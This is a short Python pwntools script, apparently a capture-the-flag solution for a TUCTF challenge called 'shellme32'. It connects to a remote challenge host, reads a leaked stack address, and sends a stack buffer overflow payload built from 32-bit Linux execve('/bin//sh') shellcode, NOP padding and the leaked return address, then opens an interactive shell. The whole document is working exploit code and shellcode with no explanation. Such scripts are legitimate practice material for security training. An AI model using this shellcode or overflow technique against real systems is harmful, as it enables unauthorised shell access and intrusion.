
from pwn import *

shell = '\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x89\xc1\x89\xc2\xb0\x0b\xcd\x80\x31\xc0\x40\xcd\x80'

r = remote('chal.tuctf.com', 30506)
# r = process('./shellme32')


r.readline()
x = int(r.readline(), 16)
r.recvuntil('> ')
p = shell + ('\x90' * (40 - len(shell))) + p32(x)
r.sendline(p)

r.interactive()
